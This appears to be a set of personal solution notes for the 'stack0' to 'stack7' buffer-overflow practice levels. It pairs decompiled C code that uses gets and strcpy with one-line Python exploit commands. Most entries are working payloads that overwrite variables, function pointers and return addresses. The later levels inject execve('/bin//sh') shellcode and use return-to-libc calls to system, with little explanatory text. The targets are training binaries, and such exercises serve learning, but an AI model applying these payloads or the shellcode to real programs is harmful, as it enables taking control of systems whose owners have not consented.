-----------------------------------------------------------------------
pwnable
-----------------------------------------------------------------------
stack0:print "A"*64+"1"

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  int v4; // [sp+1Ch] [bp-44h]@1
  int v5; // [sp+5Ch] [bp-4h]@1

  v5 = 0;
  gets((char *)&v4);
  if ( v5 )
    result = puts("you have changed the 'modified' variable");
  else
    result = puts("Try again?");
  return result;
}
-----------------------------------------------------------------------
stack1:./stack1 $(python -c 'print "A"*64+"\x64\x63\x62\x61"')

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // [sp+1Ch] [bp-44h]@3
  int v5; // [sp+5Ch] [bp-4h]@3

  if ( argc == 1 )
    errx(1, "please specify an argument\n");
  v5 = 0;
  strcpy((char *)&v4, argv[1]);
  if ( v5 == 1633837924 )
    result = puts("you have correctly got the variable to the right value");
  else
    result = printf("Try again, you got 0x%08x\n", v5);
  return result;
}

-----------------------------------------------------------------------
stack2:
GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"')


int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@4
  int v4; // [sp+18h] [bp-48h]@3
  int v5; // [sp+58h] [bp-8h]@3
  char *v6; // [sp+5Ch] [bp-4h]@1

  v6 = getenv("GREENIE");
  if ( !v6 )
    errx(1, "please set the GREENIE environment variable\n");
  v5 = 0;
  strcpy((char *)&v4, v6);
  if ( v5 == 218762506 )
    result = puts("you have correctly modified the variable");
  else
    result = printf("Try again, you got 0x%08x\n", v5);
  return result;
}
-----------------------------------------------------------------------
stack3:
0x08048424 : win()
(python -c 'print "A"*64+"\x24\x84\x04\x08"')|./stack3


int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@1
  int v4; // [sp+1Ch] [bp-44h]@1
  int (*v5)(void); // [sp+5Ch] [bp-4h]@1

  v5 = 0;
  result = (int)gets((char *)&v4);
  if ( v5 )
  {
    printf("calling function pointer, jumping to 0x%08x\n", v5);
    result = v5();
  }
  return result;
}

-----------------------------------------------------------------------
stack 4
0x80483f4 <win>

(python -c 'print "A"*72+"xxxx"+"\xf4\x83\x04\x08"')|./stack4



stack5 : 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+10h] [bp-40h]@1

  return (int)gets((char *)&v4);
}



c1:jm to esp| alsr off
(python -c 'print "A"*76+"\x16\xf4\xff\xbf"+"\x90"*32+"\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; cat)|./stack5


c2: call eax
(python -c 'print "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*51+"\xbf\x83\x04\x08"'; cat)|./stack5

c3: write to data segment(python)



stack6: 
int getpath()
{
  char s; // [sp+1Ch] [bp-4Ch]@1
  unsigned int v2; // [sp+5Ch] [bp-Ch]@1
  unsigned int retaddr; // [sp+6Ch] [bp+4h]@1

  printf("input path please: ");
  fflush(stdout);
  gets(&s);
  v2 = retaddr;
  if ( (retaddr & 0xBF000000) == -1090519040 )
  {
    printf("bzzzt (%p)\n", v2);
    _exit(1);
  }
  return printf("got path %s\n", &s);
}


c1:call system
(python -c 'print  "a"*80+"\xa0\x0d\xe4\xf7"+"xxxx"+"\xab\x19\xf6\xf7"'; cat)|./stack6

c2: write to data segment(python)


stack7: 
char *getpath()
{
  char s; // [sp+1Ch] [bp-4Ch]@1
  unsigned int v2; // [sp+5Ch] [bp-Ch]@1
  unsigned int retaddr; // [sp+6Ch] [bp+4h]@1

  printf("input path please: ");
  fflush(stdout);
  gets(&s);
  v2 = retaddr;
  if ( (retaddr & 0xB0000000) == -1342177280 )
  {
    printf("bzzzt (%p)\n", v2);
    _exit(1);
  }
  printf("got path %s\n", &s);
  return strdup(&s);
}


c1: call eax
(python -c 'print "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"A"*55+"\xbf\x84\x04\x08"' ;cat)|./stack7

c2: write to data segment(python)




